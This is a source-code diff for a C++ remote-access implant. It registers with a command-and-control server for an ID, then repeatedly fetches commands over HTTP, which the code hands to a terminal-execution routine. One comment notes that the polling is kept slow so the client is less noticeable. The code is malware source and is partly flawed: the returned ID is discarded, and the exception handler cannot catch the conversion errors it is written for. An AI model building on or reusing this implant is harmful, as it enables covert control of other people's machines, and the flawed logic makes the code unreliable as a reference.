@@ -29,6 +29,7 @@ string get_os_name() {
 
 int CLIENTNUMBER;
 string LASTCOMMAND;
+string HOSTIP = "http://127.0.0.1:3000/";
 
 struct Command{
     string time;
@@ -102,8 +103,10 @@ string send_to_terminal(string cmd){
     return final;
 }
 
-string get_command()
+string GET(string url)
 {
+    string httpURL = HOSTIP + url;
+
     CURL *curl = curl_easy_init();
     CURLcode res;
 
@@ -113,7 +116,7 @@ string get_command()
         string response_string;
         string header_string;
         readBuffer.clear();
-        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:3000/newCmd");
+        curl_easy_setopt(curl, CURLOPT_URL, httpURL.c_str());
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
         curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
@@ -123,31 +126,6 @@ string get_command()
         curl = NULL;
     }
 
-    return readBuffer;
-}
-
-
-string get_from_url(string url)
-{
-    CURL *curl = curl_easy_init();
-    CURLcode res;
-
-    struct curl_slist *list = NULL;
-
-    if(curl){
-        string response_string;
-        string header_string;
-        readBuffer.clear();
-        string GETurl = "http://127.0.0.1:3000/" + url;
-        curl_easy_setopt(curl, CURLOPT_URL, GETurl);
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
-        curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
-
-        curl_easy_perform(curl);
-        curl_easy_cleanup(curl);
-        curl = NULL;
-    }
     return readBuffer;
 }
 
@@ -209,11 +187,34 @@ string Check_Num_Send_to_Terminal(Command obj){
 
 string strip_ID_Num(string number)
 {
-    size_t plc = number.find("idNum");
-    cout << number << endl;
+    size_t plc = number.find("{\"ID");
+    //Erase up to {"ID
     number.erase(0,plc);
-    cout << number << endl;
+    //Erase ID 
+    number.erase(0,6);
+    //Remove back }
+    number.pop_back();
     return number;
+}
+
+int get_ID_num(){
+    //Connect to server and get client number
+    string tempNum;
+    int ID = -1;
+    while(ID == -1){
+        tempNum = GET("assignId");
+        tempNum = strip_ID_Num(tempNum);
+        try{
+            ID = stoi(tempNum);
+        }
+        catch(int e){
+            ID = -1;
+        }
+
+        //avoid overloading server or make client to noticeable
+        this_thread::sleep_for(chrono::seconds(1));
+    }
+    return ID;
 }
 
 
@@ -221,24 +222,17 @@ int main() {
     string os_name = get_os_name();
     LASTCOMMAND = "";
     struct Command newCmd;
-    CLIENTNUMBER = 1;
+    CLIENTNUMBER = -1;
 
-    //Connect to server and get client number
-    string tempNum;
-    /*while(CLIENTNUMBER == -1){
-        tempNum = get_from_url("assignId");
-        strip_ID_Num(tempNum);
-        cout << tempNum << endl;
-        CLIENTNUMBER == 1;
-    }  */
-
+    //Get ID for this implant
+    get_ID_num();
 
     //For testing, replace with current OS
     if (os_name == "Linux") {
         while(1)
         {
             //GET data
-            string outputTest = get_command();
+            string outputTest = GET("newCmd");
             outputTest = strip_responce_string(outputTest);
 
             if(outputTest != "")
